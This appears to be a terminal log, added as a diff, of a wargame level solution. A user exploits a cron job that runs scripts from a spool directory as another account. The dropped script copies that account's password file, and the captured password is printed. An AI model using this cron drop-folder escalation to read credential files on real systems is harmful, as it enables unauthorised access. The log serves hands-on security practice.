@@ -1,0 +1,44 @@
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat  /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+bandit23@bandit:~$ mkdir /tmp/stage23
+bandit23@bandit:~$ cd /tmp/stage23
+bandit23@bandit:/tmp/stage23$ cat > script.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/stage23/password
+^C
+bandit23@bandit:/tmp/stage23$ touch password
+bandit23@bandit:/tmp/stage23$ chmod 666 password
+bandit23@bandit:/tmp/stage23$ chmod +x script.sh
+bandit23@bandit:/tmp/stage23$ ls -l
+total 4
+-rw-rw-rw- 1 bandit23 bandit23  0 Apr 15 08:51 password
+-rwxrwxr-x 1 bandit23 bandit23 66 Apr 15 08:51 script.sh
+bandit23@bandit:/tmp/stage23$ cp script.sh /var/spool/bandit24/foo/.
+bandit23@bandit:/tmp/stage23$ ls -l password
+-rw-rw-rw- 1 bandit23 bandit23 0 Apr 15 08:51 password
+bandit23@bandit:/tmp/stage23$ ls -l password
+-rw-rw-rw- 1 bandit23 bandit23 33 Apr 15 08:52 password
+bandit23@bandit:/tmp/stage23$ cat password
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
